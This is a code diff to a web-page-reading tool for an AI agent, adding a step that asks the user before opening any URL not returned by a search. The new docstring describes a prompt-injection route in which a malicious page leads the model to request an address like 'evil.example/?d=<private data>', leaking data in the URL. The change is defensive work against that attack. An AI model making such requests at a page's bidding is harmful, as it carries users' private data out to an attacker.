@@ -1,12 +1,19 @@
-"""Read a web page (cache-first by URL) and store it in research memory."""
+"""Read a web page (cache-first by URL) and store it in research memory.
+
+A page that the user's search did not list is opened only with the user's permission: a
+malicious page could otherwise make the model request ``https://evil.example/?d=<private
+data>`` and so carry data out in the address.
+"""
 
 from __future__ import annotations
 
 import asyncio
+from urllib.parse import urlsplit
 
 from langchain_core.runnables import RunnableConfig
 from langchain_core.tools import BaseTool, StructuredTool
 
+from voicemate.agent.hitl import ask_user, is_affirmative
 from voicemate.agent.tools.base import ToolContext, ToolError, format_date, report
 from voicemate.agent.tools.documents import html_to_text, pdf_to_text
 from voicemate.agent.tools.netguard import check_url, safe_get
@@ -33,6 +40,12 @@ def build(ctx: ToolContext) -> list[BaseTool]:
             text = "\n\n".join(hit.text for hit in stored)
             header = f"[from memory, retrieved {format_date(stored[0].created)}] {UNTRUSTED_NOTE}"
             return f"{header}\n{text[:MAX_RETURN_CHARS]}"
+        if url not in ctx.offered_urls:
+            host = urlsplit(url).hostname or url
+            answer = ask_user(f"Open {host}? It was not in a search result.")
+            if not is_affirmative(answer):
+                raise ToolError(f"The user did not approve opening {host}. They said: {answer}")
+            ctx.offered_urls.add(url)
         try:
             response = await safe_get(ctx.http, url, ctx.allowed_private_hosts)
         except ToolError:
